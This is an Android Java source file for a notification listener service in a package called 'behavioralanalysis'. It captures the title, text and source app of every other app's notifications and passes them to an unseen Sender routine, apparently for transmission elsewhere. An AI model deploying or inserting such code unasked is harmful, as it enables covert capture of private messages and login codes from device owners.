package com.behavioralanalysis.service;

import android.app.Notification;
import android.content.Intent;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import org.json.JSONException;
import org.json.JSONObject;

public class NotificationListener extends NotificationListenerService {
    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String appName = sbn.getPackageName();
            if (appName.equals(getPackageName())) {
                return;
            }

            String title = sbn.getNotification().extras.getString(Notification.EXTRA_TITLE);
            CharSequence charSequenceContent = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
            String content = "";
            if (charSequenceContent != null) {
                content = charSequenceContent.toString();
            }
            long postTime = sbn.getPostTime();
            String uniqueKey = sbn.getKey();

            JSONObject data = new JSONObject();
            data.put("appName", appName);
            data.put("title", title);
            data.put("content", "" + content);
            data.put("postTime", postTime);
            data.put("key", uniqueKey);
            Sender.sendNotification(data);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
